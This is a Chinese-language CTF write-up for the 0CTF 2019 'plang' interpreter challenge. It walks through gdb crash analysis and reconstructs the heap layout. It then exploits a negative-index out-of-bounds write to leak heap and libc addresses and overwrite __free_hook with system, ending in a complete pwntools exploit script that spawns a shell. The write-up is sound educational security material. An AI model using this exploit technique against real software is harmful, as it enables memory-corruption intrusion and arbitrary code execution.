# Plang

程序给了个poc先跑一下看看

```sh

ruan@ubuntu:/mnt/hgfs/shared/tctf/pwn/plang/plang$ ./plang poc1
  ___   ____ _____ _____ _______ ____ _____ _____   ____   ___  _  ___  
 / _ \ / ___|_   _|  ___/ /_   _/ ___|_   _|  ___| |___ \ / _ \/ |/ _ \ 
| | | | |     | | | |_ / /  | || |     | | | |_      __) | | | | | (_) |
| |_| | |___  | | |  _/ /   | || |___  | | |  _|    / __/| |_| | |\__, |
 \___/ \____| |_| |_|/_/    |_| \____| |_| |_|     |_____|\___/|_|  /_/

This is a PoC!
Segmentation fault (core dumped)

```
段错误了，用gdb看看

```c
───────────────────────────[ REGISTERS ]────────────────────────
 RAX  0x4
 RBX  0x555555788c60 ◂— 0xa /* '\n' */
 RCX  0x554d55788d60
 RDX  0x4072300000000000
 RDI  0x555555773260 —▸ 0x555555773f10 ◂— 0x550000000000
 RSI  0x80000000
 R8   0x7ffff7a31c40 (main_arena) ◂— 0x0
 R9   0x0
 R10  0x555555773010 ◂— 0x700000003000101
 R11  0x0
 R12  0x555555788b49 ◂— 0x3d37010e
 R13  0x555555788bf0 —▸ 0x555555788b20 ◂— 0x1e000f0b00080e
 R14  0x555555788cd0 ◂— 0x555500000005
 R15  0x555555788560 ◂— 0x7f0000000007
 RBP  0x7fffffffdd70 —▸ 0x7fffffffde90 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf20 —▸ 0x7fffffffdf40 ◂— ...
 RSP  0x7fffffffdd50 —▸ 0x555555788cd0 ◂— 0x555500000005
 RIP  0x5555555644a6 ◂— mov    qword ptr [rcx], rax
─────────────────────────────[ DISASM]──────────────────────
 ► 0x5555555644a6    mov    qword ptr [rcx], rax
   0x5555555644a9    mov    qword ptr [rcx + 8], rdx
   0x5555555644ad    mov    rcx, qword ptr [rbp - 0x20]
   0x5555555644b1    mov    rax, qword ptr [rbp - 0x20]
   0x5555555644b5    mov    rdx, qword ptr [rax + 0x28]
   0x5555555644b9    mov    rax, qword ptr [rax + 0x20]
   0x5555555644bd    mov    qword ptr [rcx], rax
   0x5555555644c0    mov    qword ptr [rcx + 8], rdx
   0x5555555644c4    mov    eax, 1
   0x5555555644c9    leave  
   0x5555555644ca    ret    
──────────────────────[ STACK ]────────────────────────
00:0000│ rsp  0x7fffffffdd50 —▸ 0x555555788cd0 ◂— 0x555500000005
01:0008│      0x7fffffffdd58 —▸ 0x555555773260 —▸ 0x555555773f10 ◂— 0x550000000000
02:0010│      0x7fffffffdd60 ◂— 0x8000000000000005
03:0018│      0x7fffffffdd68 —▸ 0x555555788180 ◂— 0x550000000001
04:0020│ rbp  0x7fffffffdd70 —▸ 0x7fffffffde90 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf20 —▸ 0x7fffffffdf40 ◂— ...
05:0028│      0x7fffffffdd78 —▸ 0x55555555fc61 ◂— test   al, al
06:0030│      0x7fffffffdd80 —▸ 0x7fffffffddb0 —▸ 0x7fffffffddf0 —▸ 0x7fffffffde90 —▸ 0x7fffffffded0 ◂— ...
07:0038│      0x7fffffffdd88 —▸ 0x555555773260 —▸ 0x555555773f10 ◂— 0x550000000000
────────────────────────────[ BACKTRACE ]────────────────────
 ► f 0     5555555644a6
   f 1     55555555fc61
   f 2     5555555655a0
   f 3     5555555585c6
   f 4     55555555875d
   f 5     7ffff7667b97 __libc_start_main+231
Program received signal SIGSEGV (fault address 0x554d55788d60)

```
程序挂在了0x5555555644a6这里，减去基址，

```c
pwndbg> p/x 0x5555555644a6-0x555555554000
$1 = 0x104a6
```
我们可以定位在ida里定位到发生段错误的代码

```c

.text:0000000000010484                 mov     rax, [rbp+var_8]
.text:0000000000010488                 mov     rax, [rax+18h]
.text:000000000001048C                 mov     edx, [rbp+var_C]
.text:000000000001048F                 movsxd  rdx, edx
.text:0000000000010492                 shl     rdx, 4
.text:0000000000010496                 lea     rcx, [rax+rdx]
.text:000000000001049A                 mov     rax, [rbp+var_20]
.text:000000000001049E                 mov     rdx, [rax+28h]
.text:00000000000104A2                 mov     rax, [rax+20h]
.text:00000000000104A6                 mov     [rcx], rax    //这里发生了段错误
.text:00000000000104A9                 mov     [rcx+8], rdx
.text:00000000000104AD                 mov     rcx, [rbp+var_20]
.text:00000000000104B1                 mov     rax, [rbp+var_20]
.text:00000000000104B5                 mov     rdx, [rax+28h]
.text:00000000000104B9                 mov     rax, [rax+20h]
.text:00000000000104BD                 mov     [rcx], rax
.text:00000000000104C0                 mov     [rcx+8], rdx
.text:00000000000104C4                 mov     eax, 1

```
由0x10496处可以看到rcx来自rax+rdx,rax指向数组基址，rdx是偏移

在gdb中

```sh

 RAX  0x4
 RBX  0x555555788c60 ◂— 0xa /* '\n' */
 RCX  0x554d55788d60
 RDX  0x4072300000000000


►  0x5555555644a6    mov    qword ptr [rcx], rax
   0x5555555644a9    mov    qword ptr [rcx + 8], rdx
   
pwndbg> p/f 0x4072300000000000
$8 = 291

```
可以看出rdx为我们要写入的值，但是是以double类型存放的，rax为4表示类型，这样子看来程序存在一个越界写的问题。

通过gdb动态调试，可以猜测array和string的数据结构为,
```c
struct array{
	int type;
	int pad1;
	void* ptr1;
	void* ptr2;
	void* buffer_ptr; //指向存放的数据
	int size;
	int pad2;
};

struct string{
	int type;
	int pad1;
	void* ptr1;
	void* ptr3;
	int value;	//根据string的长度和内容算出来的值，暂不知道有什么用
	int len;
	char buf[];
};

```
比如我定义了一个 var b = [1,2,"aaaaaaa"]

内存布局为

```c
pwndbg> telescope 0x561fc3e87ee0  //array
00:0000│   0x561fc3e87ee0 ◂— 0x1
01:0008│   0x561fc3e87ee8 —▸ 0x561fc3e7e240 ◂— 0x0
02:0010│   0x561fc3e87ef0 —▸ 0x561fc3e888b0 ◂— 0xa /* '\n' */
03:0018│   0x561fc3e87ef8 —▸ 0x561fc3e88920 ◂— 0x4
04:0020│   0x561fc3e87f00 ◂— 0x400000003
05:0028│   0x561fc3e87f08 ◂— 0x31 /* '1' */
06:0030│   0x561fc3e87f10 ◂— 0x560000000005
07:0038│   0x561fc3e87f18 —▸ 0x561fc3e7c120 ◂— 0x0
pwndbg> telescope 0x561fc3e88920	//buffer_ptr
00:0000│   0x561fc3e88920 ◂— 0x4		//double类型的type为4
01:0008│   0x561fc3e88928 ◂— 0x3ff0000000000000
02:0010│   0x561fc3e88930 ◂— 0x4
03:0018│   0x561fc3e88938 ◂— 0x4008000000000000
04:0020│   0x561fc3e88940 ◂— 0x5		//其它类型的都为5
05:0028│   0x561fc3e88948 —▸ 0x561fc3e87f10 ◂— 0x560000000005 //string
06:0030│   0x561fc3e88950 ◂— 0x0
... ↓
pwndbg> telescope 0x561fc3e87f10	//string
00:0000│   0x561fc3e87f10 ◂— 0x560000000005
01:0008│   0x561fc3e87f18 —▸ 0x561fc3e7c120 ◂— 0x0
02:0010│   0x561fc3e87f20 —▸ 0x561fc3e882d0 ◂— 0x7f0000000007
03:0018│   0x561fc3e87f28 ◂— 0x7bff4a41e
04:0020│   0x561fc3e87f30 ◂— 0x61616161616161 /* 'aaaaaaa' */
05:0028│   0x561fc3e87f38 ◂— 0x51 /* 'Q' */
06:0030│   0x561fc3e87f40 ◂— 0x1
07:0038│   0x561fc3e87f48 ◂— 0x0


//当我把string的长度改大时

pwndbg> telescope 0x561fc3e87f10	//string
00:0000│   0x561fc3e87f10 ◂— 0x560000000005
01:0008│   0x561fc3e87f18 —▸ 0x561fc3e7c120 ◂— 0x0
02:0010│   0x561fc3e87f20 —▸ 0x561fc3e882d0 ◂— 0x7f0000000007
03:0018│   0x561fc3e87f28 ◂— 0x11bff4a41e   //这里长度原先为7，被我改成了0x11
04:0020│   0x561fc3e87f30 ◂— 0x61616161616161 /* 'aaaaaaa' */
05:0028│   0x561fc3e87f38 ◂— 0x51 /* 'Q' */
06:0030│   0x561fc3e87f40 ◂— 0x1
07:0038│   0x561fc3e87f48 ◂— 0x0

> $ System.print(b[2][8])
[DEBUG] Sent 0x16 bytes:
    'System.print(b[2][8])\n'
[DEBUG] Received 0x4 bytes:
    'Q\n'
    '> '
Q
> $  

//可以看见产生了越界读

```

然后问题就是怎么越界写了，原先poc里的b[0x80000000]越界写不了，因为偏移这么大会是一个非法的地址。。。

然后看了Ne0大佬的wp，b[0-0x100]即可orz

根据大佬的思路，构造一个字符串s,两个数组a和b

然后内存的布局为

```c

string s

array a

arrya b

```
然后我们可以通过a修改s的长度，产生越界读，在用b修改a，可以任意地址写

前面地址泄露都很顺利，但是到了任意地址写的时候卡住了，因为程序的num类型都是double类型的，于是我想到了 struct.unpack("<d",p64(libc.symbols["__free_hook"]-8))[0] 然后会返回这样的6.9098703773281e-310式子。然后我就向程序中写入0.00000000........69098703773281，但是，这样写产生了精度丢失的问题，我太菜了，无法保证一定写入__free_hook-8的位置

后来又去参考了另一篇文章，’ %.330f'%struct.unpack("<d",p64(libc.symbols["__free_hook"]-8))[0]这样即可，orz，330f也可以换成340f啥的，这个精度最后好像都只有e-310

这里我选择了把free_hook改成了system的地址，因为我发现var a = "sh"时会有一次free，且rdi就是指向“sh”

最终的exp如下

```python

from pwn import *
import struct

def main(host,port=0):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./plang")
		gdb.attach(p)
	p.recvuntil("> ")
	p.sendline('var s = "rrrA"')
	p.recvuntil("> ")
	p.sendline('var a = [1,2,"aaaaaaaaaa"]')
	p.recvuntil("> ")
	p.sendline('var b = [1,2,"bbbbbbbbbb"]')
	p.recvuntil("> ")
	p.sendline('a[0-0xc6] = 2')
	heap = 0
	for i in range(6):
		p.recvuntil("> ")
		p.sendline('System.print(s[{}])'.format(0x2d-i))
		heap =  (heap << 8) | ord(p.recv(1))
	heap = heap - 0x15ce0
	info("heap : " + hex(heap))
	
	libc.address = 0
	
	for i in range(6):
		p.recvuntil("> ")
		p.sendline('System.print(s[{}])'.format(0xfd-i))
		libc.address =  (libc.address << 8) | ord(p.recv(1))
	libc.address = libc.address - 0x3ebca0
	info("libc : " + hex(libc.address))
	
	p.recvuntil("> ")
	p.sendline('b[0-0x32] = %.340f'%struct.unpack("<d",p64(libc.symbols["__free_hook"]-8))[0])
	
	p.recvuntil("> ")
	p.sendline('a[0] = %.340f'%struct.unpack("<d",p64(libc.symbols["system"]))[0])
	
	p.recvuntil("> ")
	p.sendline('var a = "sh"')
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so")
	main(args['REMOTE'])

```
参考链接：

[https://www.anquanke.com/post/id/177270](https://www.anquanke.com/post/id/177270)
[https://changochen.github.io/2019-03-23-0ctf-2019.html](https://changochen.github.io/2019-03-23-0ctf-2019.html)

